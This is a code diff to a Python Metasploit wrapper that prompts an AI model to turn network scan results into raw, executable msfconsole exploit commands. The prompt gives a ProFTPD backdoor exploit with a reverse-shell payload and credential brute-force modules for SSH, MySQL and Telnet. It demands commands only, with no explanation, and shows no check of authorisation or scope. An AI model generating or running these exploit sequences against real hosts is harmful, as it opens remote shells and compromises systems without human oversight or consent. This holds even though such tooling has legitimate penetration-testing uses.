@@ -85,15 +85,25 @@ class MetasploitTool(BaseTool):
     def get_ai_prompt(self, user_request: str, scan_context: Optional[Dict] = None) -> str:
         """Create AI prompt with scan context"""
         
+        # Ensure scan_context is a dict or None
+        if scan_context and not isinstance(scan_context, dict):
+            console.print(f"[yellow]Warning: scan_context is not a dict, ignoring[/yellow]")
+            scan_context = None
+        
         context_info = ""
+        target_host = "TARGET"
+        
         if scan_context:
             context_info = "\n\n=== PREVIOUS SCAN DATA ===\n"
             
             if 'target' in scan_context:
                 context_info += f"Target: {scan_context['target']}\n"
+                target_host = scan_context['target']
             
             if 'ip' in scan_context:
                 context_info += f"IP Address: {scan_context['ip']}\n"
+                # Prefer IP over hostname for RHOSTS
+                target_host = scan_context['ip']
             
             if 'open_ports' in scan_context and scan_context['open_ports']:
                 context_info += f"\nOpen Ports Found:\n"
@@ -111,54 +121,71 @@ class MetasploitTool(BaseTool):
 
 {context_info}
 
-YOUR MISSION: Automatically exploit vulnerabilities found in the scan data above.
+YOUR MISSION: Generate EXECUTABLE msfconsole commands to exploit the target.
 
-CRITICAL RULES:
-1. AUTOMATICALLY select and configure exploits for vulnerable services
-2. Use the scan data to target specific services/versions
-3. For EACH vulnerable service, generate a COMPLETE exploit attempt
-4. Include ALL necessary configuration (RHOSTS, RPORT, LHOST, LPORT, payload)
-5. Use 'check' command first to verify if target is vulnerable
-6. Then use 'exploit' or 'run' command to attempt exploitation
-7. Format as actual executable msfconsole commands, one per line
+CRITICAL FORMAT RULES:
+1. Output ONLY raw msfconsole commands, one per line
+2. NO explanations, NO descriptions, NO markdown, NO numbering
+3. NO sentences like "Searching for..." or "Scanning for..."
+4. ONLY actual commands that msfconsole can execute
+5. Use EXACTLY "{target_host}" for RHOSTS - DO NOT modify it, DO NOT add "www." prefix
 
-EXPLOITATION STRATEGY:
-- For FTP (ProFTPD, vsftpd, etc.): Search version-specific exploits
-- For SSH: Try auxiliary/scanner modules, check for weak auth
-- For HTTP/Apache: Check for path traversal, RCE vulnerabilities
-- For MySQL: Try authentication bypass, SQL injection modules
-- For SMTP/Mail services: Check for command injection
-- For any service: ALWAYS configure and RUN the exploit, don't just search
-
-COMMAND STRUCTURE FOR EACH EXPLOIT ATTEMPT:
-search <service> <version>
-use <exploit/path/to/module>
-set RHOSTS <target_ip_or_hostname>
-set RPORT <port_number>
-set LHOST <your_ip>
+REQUIRED COMMAND FORMAT (example):
+search proftpd
+use exploit/unix/ftp/proftpd_133c_backdoor
+set RHOSTS {target_host}
+set RPORT 21
+set PAYLOAD cmd/unix/reverse
+set LHOST tun0
 set LPORT 4444
 check
 exploit
 
-EXAMPLE (if ProFTPD detected on port 21):
+CRITICAL RHOSTS RULES:
+- Use RHOSTS {target_host} EXACTLY as provided
+- DO NOT add "www." before IP addresses
+- DO NOT modify the target value in any way
+- If target is an IP, use the IP directly: {target_host}
+- If target is a domain, use the domain: {target_host}
+
+CRITICAL: Always include payload configuration!
+- For exploits: set PAYLOAD, set LHOST, set LPORT
+- For auxiliary modules: No payload needed
+- Use LHOST tun0 or LHOST eth0 (let the system choose interface)
+
+EXPLOITATION STRATEGY:
+- For FTP (port 21): Search version-specific exploits, set payload
+- For SSH (port 22): Use auxiliary/scanner/ssh/ssh_login (no payload)
+- For SMTP (port 25, 587): Use auxiliary/scanner/smtp/smtp_enum (no payload)
+- For HTTP (port 80, 443): Search web exploits, set payload
+- For MySQL (port 3306): Use auxiliary/scanner/mysql/mysql_login (no payload)
+- For Telnet (port 23): Use auxiliary/scanner/telnet/telnet_login (no payload)
+
+EXAMPLE OUTPUT FOR EXPLOIT (CORRECT):
 search proftpd
 use exploit/unix/ftp/proftpd_133c_backdoor
-set RHOSTS {scan_context.get('target', 'TARGET') if scan_context else 'TARGET'}
+set RHOSTS {target_host}
 set RPORT 21
+set PAYLOAD cmd/unix/reverse
 set LHOST tun0
-check
+set LPORT 4444
 exploit
 
-EXAMPLE (if MySQL detected on port 3306):
-use auxiliary/scanner/mysql/mysql_login
-set RHOSTS {scan_context.get('target', 'TARGET') if scan_context else 'TARGET'}
-set RPORT 3306
-set USERNAME root
-set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+EXAMPLE OUTPUT FOR AUXILIARY (CORRECT):
+use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS {target_host}
+set RPORT 25
 run
 
-OUTPUT ONLY EXECUTABLE COMMANDS - NO EXPLANATIONS, NO MARKDOWN, NO COMMENTS.
-Generate commands for AT LEAST 2-3 different exploits based on the scan data."""
+EXAMPLE OUTPUT (WRONG - DO NOT DO THIS):
+1. Searching for SMTP vulnerabilities...
+   - Found smtp_enum module
+2. Scanning port 25...
+
+Remember: 
+- EXPLOITS need PAYLOAD configuration
+- AUXILIARY modules just need 'run'
+- Output ONLY executable commands, nothing else."""
 
         return prompt
     
@@ -186,17 +213,40 @@ Generate commands for AT LEAST 2-3 different exploits based on the scan data."""
             
             for line in lines:
                 line = line.strip()
+                
+                # Skip empty lines
+                if not line:
+                    continue
+                
+                # Skip lines that are clearly explanations
+                skip_patterns = [
+                    r'^[-*•]\s*[A-Z]',  # Bullet points starting with capital letter
+                    r'^\d+\.\s+[A-Z]',  # Numbered lists starting with capital letter
+                    r'^(Searching|Scanning|Found|Investigating|Trying|Attempting)',  # Explanation words
+                    r'exploit found|discovered|module',  # Discovery descriptions
+                ]
+                
+                should_skip = False
+                for pattern in skip_patterns:
+                    if re.match(pattern, line):
+                        should_skip = True
+                        break
+                
+                if should_skip:
+                    continue
+                
                 # Remove common prefixes like "- ", "* ", "1. ", etc.
                 line = re.sub(r'^[-*•]\s*', '', line)
                 line = re.sub(r'^\d+\.\s*', '', line)
                 
+                # Check if line is a valid msfconsole command
                 if any(line.startswith(cmd + ' ') or line == cmd for cmd in msf_commands):
                     commands.append(line)
         
         # Debug output
         if not commands:
             console.print(f"[yellow]Debug: Could not extract commands from AI response[/yellow]")
-            console.print(f"[dim]AI Response preview: {ai_response[:300]}...[/dim]")
+            console.print(f"[dim]AI Response preview: {ai_response[:500]}...[/dim]")
         
         return commands
     
